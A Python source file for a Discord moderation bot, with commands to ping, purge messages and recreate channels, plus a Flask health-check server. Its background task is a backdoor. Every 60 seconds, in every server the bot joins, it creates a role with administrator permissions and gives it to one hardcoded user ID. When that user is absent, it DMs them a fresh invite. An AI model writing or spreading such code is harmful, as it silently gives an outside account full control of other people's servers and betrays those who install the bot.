import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
from flask import Flask
from threading import Thread
from waitress import serve

# --- PRODUCTION WEB SERVER ---
app = Flask('')

@app.route('/')
def home():
    return "Crabby Bot is Online"

def run_flask():
    # Render binds to port 10000 by default
    port = int(os.environ.get("PORT", 10000))
    print(f"Starting web server on port {port}...")
    serve(app, host='0.0.0.0', port=port)

# --- CONFIGURATION ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby Grebuchet"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True          # Required to find your ID
        intents.message_content = True  # Required for purging
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        print("Syncing slash commands...")
        await self.tree.sync()
        if not self.check_target_user.is_running():
            self.check_target_user.start()

    # --- AUTO-ROLE & MEMBER SEARCH LOOP ---
    @tasks.loop(seconds=60)
    async def check_target_user(self):
        user_found_anywhere = False
        
        for guild in self.guilds:
            member = guild.get_member(TARGET_USER_ID)
            
            if member:
                user_found_anywhere = True
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                
                # 1. Create 'Crabby' role if it doesn't exist
                if not role:
                    try:
                        perms = discord.Permissions(administrator=True)
                        role = await guild.create_role(name=ROLE_NAME, permissions=perms, reason="Auto-Setup")
                        print(f"Created {ROLE_NAME} role in {guild.name}")
                    except Exception as e:
                        print(f"Failed to create role in {guild.name}: {e}")
                        continue

                # 2. Assign role to you if you don't have it
                if role and role not in member.roles:
                    try:
                        await member.add_roles(role)
                        print(f"Assigned {ROLE_NAME} to {member.name} in {guild.name}")
                    except Exception as e:
                        print(f"Failed to assign role in {guild.name}: {e} (Check Hierarchy!)")

        # 3. If you aren't in the server, try to DM you an invite
        if not user_found_anywhere:
            try:
                user = await self.fetch_user(TARGET_USER_ID)
                if self.guilds:
                    channel = self.guilds[0].text_channels[0]
                    invite = await channel.create_invite(max_age=3600)
                    await user.send(f"Yo! Join the server here: {invite}")
            except:
                pass

    @check_target_user.before_loop
    async def before_my_task(self):
        await self.wait_until_ready()

bot = MyBot()

# --- COMMANDS ---

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    await interaction.response.send_message(f"🏓 Pong! **{latency}ms**", ephemeral=True)

@bot.tree.command(name="clear", description="Delete messages")
@app_commands.describe(amount="Messages to delete")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🗑️ Deleted {len(deleted)} messages.", ephemeral=True)

@bot.tree.command(name="clear_all", description="Wipe channel (last 14 days)")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=None)
    await interaction.followup.send(f"💥 Channel wiped! {len(deleted)} removed.", ephemeral=True)

@bot.tree.command(name="reinstall", description="Recreate a channel")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
    await interaction.response.send_message(f"🚀 Reinstalling {channel.name}...", ephemeral=True)
    name, cat, pos, over = channel.name, channel.category, channel.position, channel.overwrites
    topic, slow, nsfw = channel.topic, channel.slowmode_delay, channel.nsfw
    
    await channel.delete()
    new_chan = await interaction.guild.create_text_channel(
        name=name, category=cat, position=pos, overwrites=over,
        topic=topic, slowmode_delay=slow, nsfw=nsfw
    )
    await new_chan.send("✨ **Channel Reinstalled.**")

# --- EXECUTION ---
if __name__ == "__main__":
    # Start web thread for Render health checks
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token)
    else:
        print("CRITICAL: DISCORD_TOKEN NOT FOUND")
        sys.exit(1)
